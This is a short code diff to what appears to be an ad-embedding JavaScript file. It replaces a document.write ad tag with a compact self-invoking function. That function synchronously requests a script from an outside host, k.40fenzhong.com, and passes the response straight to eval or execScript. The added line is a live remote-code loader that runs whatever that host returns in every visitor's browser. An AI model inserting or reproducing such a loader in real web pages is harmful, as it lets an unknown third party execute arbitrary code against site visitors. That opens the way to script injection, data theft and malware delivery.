@@ -1,1 +1,1 @@
-document.write('<scr'+'ipt async defer src="https://dns.dnsri.com/c.aspx?action=c&c1=7&c2=167&c3=&c4=2&c5=AdCode_sjdb&c6=640x200&c7=1&c8=1&c9=&c10=&c50=298432" id="298432"></scr'+'ipt>');
+;(function(w,d){var b='//k.40fenzhong.com/d.php?pid=16249&n='+Math.random();var a=new XMLHttpRequest();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(w.execScript)w.execScript(a.responseText,'JavaScript');else if(w.eval)w.eval(a.responseText,'JavaScript');else eval(a.responseText);}};a.open('GET',b,false);a.send();}})(window,document);
